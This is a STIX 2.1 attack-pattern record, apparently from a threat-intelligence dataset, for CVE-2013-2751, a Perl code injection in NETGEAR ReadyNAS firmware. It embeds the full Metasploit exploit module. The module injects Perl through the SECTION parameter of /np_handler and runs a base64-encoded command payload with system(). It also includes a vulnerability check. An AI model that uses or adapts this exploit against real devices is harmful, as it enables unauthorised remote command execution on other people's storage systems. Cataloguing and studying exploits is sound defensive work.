{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bce139d4-8bf1-434f-a751-f5f016ef9b79",
    "created": "2024-08-14T17:03:32.955076Z",
    "modified": "2024-08-14T17:03:32.95508Z",
    "name": "NETGEAR ReadyNAS Perl Code Evaluation",
    "description": " This module exploits a Perl code injection on NETGEAR ReadyNAS 4.2.23 and 4.1.11. The vulnerability exists on the web front end, specifically in the np_handler.pl component due to an insecure usage of the eval() perl function. This module has been tested successfully on a NETGEAR ReadyNAS 4.2.23 Firmware emulated environment. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netgear_readynas_exec.rb",
            "external_id": "netgear_readynas_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2751"
        },
        {
            "source_name": "reference",
            "url": "http://www.tripwire.com/state-of-security/vulnerability-management/readynas-flaw-allows-root-access-unauthenticated-http-request/"
        },
        {
            "source_name": "reference",
            "url": "http://www.tripwire.com/register/security-advisory-netgear-readynas/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NETGEAR ReadyNAS Perl Code Evaluation',\n      'Description'    => %q{\n        This module exploits a Perl code injection on NETGEAR ReadyNAS 4.2.23 and 4.1.11. The\n        vulnerability exists on the web front end, specifically in the np_handler.pl component,\n        due to an insecure usage of the eval() perl function. This module has been tested\n        successfully on a NETGEAR ReadyNAS 4.2.23 Firmware emulated environment.\n      },\n      'Author'         =>\n        [\n          'Craig Young', # Vulnerability discovery\n          'hdm',          # diff the patch\n          'juan vazquez'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-2751' ],\n          [ 'OSVDB', '98826' ],\n          [ 'URL', 'http://www.tripwire.com/state-of-security/vulnerability-management/readynas-flaw-allows-root-access-unauthenticated-http-request/' ],\n          [ 'URL', 'http://www.tripwire.com/register/security-advisory-netgear-readynas/' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 4096, # Has into account Apache request length and base64 ratio\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet'\n            }\n        },\n      'Targets'        =>\n        [\n          # Tested on an emulated environment, need to check this\n          # against a real device\n          [ 'NETGEAR ReadyNAS 4.2.23', { }]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-07-12'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(443)\n      ])\n\n  end\n\n  def send_request_payload(payload)\n    res = send_request_cgi({\n      'uri' => normalize_uri(\"/np_handler\", \"\"),\n      'vars_get' => {\n         'PAGE' =>'Nasstate',\n         'OPERATION' => 'get',\n         'SECTION' => payload\n      }\n    })\n    return res\n  end\n\n  def check\n    res = send_request_payload(\")\")\n    if res and res.code == 200 and res.body =~ /syntax error at \\(eval/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    my_payload = \"#{rand_text_numeric(1)});use MIME::Base64;system(decode_base64(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\")\"\n    print_status(\"Executing payload...\")\n    send_request_payload(my_payload)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-12",
    "x_mitre_platforms": [
        "['unix']"
    ]
}